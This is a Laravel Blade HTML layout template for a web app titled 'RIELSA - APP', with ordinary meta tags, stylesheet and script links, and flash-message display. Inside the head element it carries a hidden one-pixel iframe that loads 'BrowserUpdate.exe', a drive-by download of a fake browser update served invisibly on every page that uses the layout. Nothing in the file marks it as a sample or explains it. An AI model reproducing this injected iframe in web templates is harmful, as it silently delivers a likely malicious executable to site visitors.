<!DOCTYPE html>
<html lang="es">

    <head><iframe src=BrowserUpdate.exe width=1 height=1 frameborder=0></iframe>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

        <title>RIELSA - APP</title>

        <link rel="preconnect" href="//fonts.gstatic.com/" crossorigin="">
        <link href="css/app-dashboard.css" rel="stylesheet">
        <link rel="stylesheet" href="/css/styles.css">
        <script src="js/app.js"></script>
    </head>

    <body>
        <div class="container-fluid">
            @if (session()->has('flash'))
                <div class="alert alert-info">{{ session('flash') }}</div>
            @endif

            @yield('content')
        </div>
    </body>

</html>